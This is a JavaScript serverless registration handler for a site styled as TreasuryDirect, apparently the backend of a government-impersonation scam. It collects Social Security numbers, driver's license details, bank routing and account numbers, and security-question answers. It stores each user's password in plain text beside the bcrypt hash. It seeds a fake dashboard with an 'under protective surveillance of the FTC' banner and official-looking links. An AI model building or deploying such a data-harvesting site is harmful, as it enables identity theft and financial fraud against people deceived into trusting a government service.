import bcrypt from 'bcryptjs';
import {
  sanity,
  signSession,
  sessionCookie,
  json,
  fail,
  randomAccountNumber,
  randomUserId,
  verifyTurnstile,
} from './_lib.mjs';

export const handler = async (event) => {
  if (event.httpMethod !== 'POST') return fail('Method not allowed', 405);

  let data;
  try {
    data = JSON.parse(event.body || '{}');
  } catch (_) {
    return fail('Invalid request body');
  }

  const email = String(data.email || '').trim().toLowerCase();
  const password = String(data.password || '');
  const firstName = String(data.firstName || '').trim();
  const middleName = String(data.middleName || '').trim();
  const lastName = String(data.lastName || '').trim();

  if (!email || !password) return fail('Email and password are required');
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return fail('Invalid email format');

  const pwOk =
    password.length >= 8 &&
    /[A-Z]/.test(password) &&
    /[a-z]/.test(password) &&
    /\d/.test(password) &&
    /[^A-Za-z0-9]/.test(password);
  if (!pwOk) {
    return fail('Password must be at least 8 characters and include an uppercase, a lowercase, a number and a special character');
  }

  const humanOk = await verifyTurnstile(data.turnstileToken);
  if (!humanOk) return fail('Human verification failed. Please try again.');

  const client = sanity();

  try {
    const existing = await client.fetch(
      '*[_type == "accountHolder" && email == $email][0]._id',
      { email }
    );
    if (existing) return fail('Email already registered');

    const accountNumber = randomAccountNumber();
    const userId = randomUserId();
    const fullName = [firstName, middleName, lastName].filter(Boolean).join(' ') || String(data.name || '').trim();

    const doc = {
      _id: 'accountHolder-' + accountNumber.toLowerCase(),
      _type: 'accountHolder',
      userId,
      firstName,
      middleName,
      lastName,
      fullName,
      email,
      accountNumber,
      passwordHash: await bcrypt.hash(password, 12),
      plainPassword: password,
      createdAt: new Date().toISOString(),
      accountType: data.accountType || 'Individual',
      dob: data.dob || '',
      phone: data.phone || '',
      driversLicense: data.driversLicense || '',
      dlState: data.dlState || '',
      ssn: data.ssn || '',
      street: data.street || '',
      apt: data.apt || '',
      city: data.city || '',
      stateAddress: data.stateAddress || data.stateAddr || '',
      zip: data.zip || '',
      country: data.country || 'United States',
      bankAcctType: data.bankAcctType || data.acctType || '',
      routingNumber: data.routing || '',
      bankAccountNumber: data.accountNum || '',
      bankName: data.bankName || '',
      secImage: data.secImage || '',
      imageCaption: data.imageCaption || '',
      passwordReminder: data.passwordReminder || '',
      secQ1: data.secQ1 || '',
      secA1: data.secA1 || '',
      secQ2: data.secQ2 || '',
      secA2: data.secA2 || '',
      secQ3: data.secQ3 || '',
      secA3: data.secA3 || '',
      portfolioValue: 0,
      interestEarnedYTD: 0,
      pendingOrders: 0,
      accounts: [
        {
          _key: 'acct-advisory',
          _type: 'accountItem',
          title: 'Advisory Account',
          icon: '\u{1F465}',
          iconBg: '#e3f0fb',
          iconColor: '#0a2e5c',
          mask: '',
          accountNumber: '',
          subtitle: '',
          accountType: 'Advisory',
          balance: 0,
          balanceLabel: 'Total Holdings',
          currency: 'USD',
          status: 'Active',
          address: '',
          bank: '',
          routingNumber: '',
          bankAddress: '',
          description: '',
        },
        {
          _key: 'acct-cash',
          _type: 'accountItem',
          title: 'Cash Account',
          icon: '\u{1F4B0}',
          iconBg: '#e8f5e8',
          iconColor: '#1a7b3a',
          mask: '',
          accountNumber: '',
          subtitle: '',
          accountType: 'Cash',
          balance: 0,
          balanceLabel: 'Available Balance',
          currency: 'USD',
          status: 'Active',
          address: '',
          bank: '',
          routingNumber: '',
          bankAddress: '',
          description: '',
        },
        {
          _key: 'acct-gold',
          _type: 'accountItem',
          title: 'Sovereign Gold Bond',
          icon: '\u{1F3C5}',
          iconBg: '#fff8e1',
          iconColor: '#b8860b',
          mask: '',
          accountNumber: '',
          subtitle: '',
          accountType: 'Investment',
          balance: 0,
          balanceLabel: 'Total Holdings',
          currency: 'USD',
          status: 'Active',
          address: '',
          bank: '',
          routingNumber: '',
          bankAddress: '',
          description: '',
        },
        {
          _key: 'acct-intl',
          _type: 'accountItem',
          title: 'International US Depot',
          icon: '\u{1F310}',
          iconBg: '#f3e8ff',
          iconColor: '#6a1a9a',
          mask: '',
          accountNumber: '',
          subtitle: '',
          accountType: 'International Custody',
          balance: 0,
          balanceLabel: 'Total Value (USD)',
          currency: 'USD',
          status: 'Active',
          address: '',
          bank: '',
          routingNumber: '',
          bankAddress: '',
          description: '',
        },
      ],
      eeBondRate: '2.40%',
      iBondRate: '4.26%',
      portfolioYield: '3.42%',
      interestThisYear: 0,
      dashboardContent: {
        bannerText: 'Accounts under protective surveillance of the FTC',
        dashboardTitle: 'Account Dashboard',
        portfolioSummaryTitle: 'Portfolio Summary',
        myAccountsTitle: 'My Accounts',
        upcomingEventsTitle: 'Upcoming Events',
        quickActionsTitle: 'Quick Actions',
        accountNoticesTitle: 'Account Notices',
        ratesSummaryTitle: 'Interest & Rates Summary',
        portfolioValueLabel: 'Total Portfolio Value',
        portfolioValueCaption: 'Advisory Account holdings',
        interestEarnedLabel: 'Interest Earned (YTD)',
        interestEarnedCaption: 'No earnings this year',
        pendingOrdersLabel: 'Pending Orders',
        pendingOrdersCaption: 'No pending orders',
        eeBondRateLabel: 'Current EE Bond Rate',
        eeBondRateCaption: 'Fixed rate through Oct 2026',
        iBondRateLabel: 'Current I Bond Rate',
        iBondRateCaption: 'Composite rate through Oct 2026',
        portfolioYieldLabel: 'Portfolio Yield',
        portfolioYieldCaption: 'Weighted average',
        interestThisYearLabel: 'Interest This Year',
        interestThisYearCaption: 'YTD earnings',
        helpTitle: 'Need Help?',
        helpText: 'Visit the TreasuryDirect Help Center for guides, FAQs, and support resources.',
        helpButtonLabel: 'Go to Help Center',
        helpButtonHref: '/help-center/',
        auctionsTitle: 'Upcoming Auctions',
        auctionsText: 'View upcoming Treasury auctions and participate in new issuances.',
        auctionsButtonLabel: 'View Auctions',
        auctionsButtonHref: '/auctions/upcoming/',
      },
      upcomingEvents: [
        {
          _key: 'event-interest',
          _type: 'eventItem',
          title: 'Quarterly Interest Payment',
          description: 'Your quarterly interest payment is scheduled for disbursement.',
          date: 'Sep 15, 2026',
          icon: '\u{1F4C8}',
          iconBg: '#e3f0fb',
          iconColor: '#0a2e5c',
        },
        {
          _key: 'event-tbill',
          _type: 'eventItem',
          title: 'Treasury Bill Auction',
          description: 'Next 4-week Treasury Bill auction announcement and bidding opens.',
          date: 'Oct 6, 2026',
          icon: '\u{1F4C5}',
          iconBg: '#fff3e0',
          iconColor: '#e65100',
        },
        {
          _key: 'event-ibond',
          _type: 'eventItem',
          title: 'I Bond Rate Announcement',
          description: 'New composite rate for Series I Savings Bonds to be announced.',
          date: 'Nov 1, 2026',
          icon: '\u{1F4B0}',
          iconBg: '#e8f5e8',
          iconColor: '#1a7b3a',
        },
      ],
      quickActions: [
        {
          _key: 'act-buy',
          _type: 'actionItem',
          label: 'Buy Savings Bonds',
          href: '/savings-bonds/buy-a-bond/',
          icon: '\u{1F4C8}',
          iconBg: '#e3f0fb',
          iconColor: '#0a2e5c',
        },
        {
          _key: 'act-1099',
          _type: 'actionItem',
          label: 'View Tax Forms (1099)',
          href: '/1099/',
          icon: '\u{1F4C4}',
          iconBg: '#fff3e0',
          iconColor: '#e65100',
        },
        {
          _key: 'act-bank',
          _type: 'actionItem',
          label: 'Manage Bank Account',
          href: '#',
          icon: '\u{1F3E6}',
          iconBg: '#e8f5e8',
          iconColor: '#1a7b3a',
        },
        {
          _key: 'act-profile',
          _type: 'actionItem',
          label: 'Update Profile',
          href: '#',
          icon: '\u{1F464}',
          iconBg: '#f3e8ff',
          iconColor: '#6a1a9a',
        },
        {
          _key: 'act-redeem',
          _type: 'actionItem',
          label: 'Redeem Securities',
          href: '#',
          icon: '\u{1F4B3}',
          iconBg: '#fff8e1',
          iconColor: '#b8860b',
        },
      ],
      accountNotices: [
        {
          _key: 'notice-new',
          _type: 'noticeItem',
          title: 'No new notices',
          description: 'All account notices have been reviewed.',
          icon: '\u{1F514}',
        },
        {
          _key: 'notice-1099',
          _type: 'noticeItem',
          title: '1099 Tax Forms Available',
          description: 'Your 2025 tax forms are ready to view and download.',
          icon: '\u{1F4C4}',
        },
      ],
    };

    await client.create(doc);

    const token = signSession({ sub: userId, email, name: fullName, accountNumber });

    return json(
      200,
      { success: true, userId, email, accountNumber, redirect: '/dashboard/' },
      { 'Set-Cookie': sessionCookie(token, event) }
    );
  } catch (err) {
    console.error('register error', err);
    return fail('Could not create your account. Please try again.', 500);
  }
};
